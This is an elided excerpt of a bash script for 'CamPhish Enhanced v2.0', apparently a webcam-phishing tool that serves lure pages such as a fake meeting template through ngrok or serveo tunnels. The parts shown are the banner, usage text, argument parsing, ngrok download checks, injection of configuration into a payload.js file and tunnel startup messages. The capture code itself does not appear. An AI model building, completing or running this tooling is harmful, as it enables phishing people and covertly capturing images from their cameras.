...
# CamPhish Enhanced v2.0 — Automated Edition
...
banner() {
    ...
    printf "  ║${CYAN}  Enhanced v2.0 — Automated Edition ${GREEN}                     ║\n"
...
usage() {
    ...
    printf "  --tunnel <ngrok|serveo>     Tunnel service (default: ngrok)\n"

    printf "  --ngrok-token <token>       Ngrok auth token\n"
    ...
    printf "  $0 --tunnel ngrok --template meeting --ngrok-token abc123\n"
...
parse_args() {
    ...
    while [[ $# -gt 0 ]]; do
        ...
        case "$1" in
            ...
            --ngrok-token) NGROK_AUTH_TOKEN="$2"; shift 2 ;;
...
check_deps() {
    ...
    if [[ "$TUNNEL" == "ngrok" ]]; then
        ...
        if [[ ! -e ./ngrok ]]; then
            ...
            printf "${YELLOW}[!] Ngrok binary not found. Downloading...${RESET}\n"

            command -v wget > /dev/null 2>&1 || { printf "${RED}[!] wget required for download. Aborting.${RESET}\n"; exit 1; }

            command -v unzip > /dev/null 2>&1 || { printf "${RED}[!] unzip required for download. Aborting.${RESET}\n"; exit 1; }
        ...
        printf "${GREEN}  ✓${WHITE} Ngrok found${RESET}\n"
...
inject_config() {
    ...
    # Inject config into payload.js for this session

    # The payload.js reads CAMPHISH_CONFIG from the HTML, but we also sed the base URL

    # into the generated index2.html
...
start_ngrok() {
    ...
    elif [[ ! -e ~/.ngrok2/ngrok.yml ]] && [[ ! -e ~/.config/ngrok/ngrok.yml ]]; then

        printf "${RED}[!] No ngrok auth token provided and none found in config. Use --ngrok-token${RESET}\n"
    ...
    printf "${GREEN}[+]${WHITE} Starting ngrok tunnel...${RESET}\n"
    ...
    if [[ -z "$LINK" ]]; then
        ...
        printf "${RED}[!] Failed to get ngrok URL. Check:${RESET}\n"

        printf "${YELLOW}  - Ngrok auth token is valid${RESET}\n"

        printf "${YELLOW}  - No other ngrok instance running (killall ngrok)${RESET}\n"
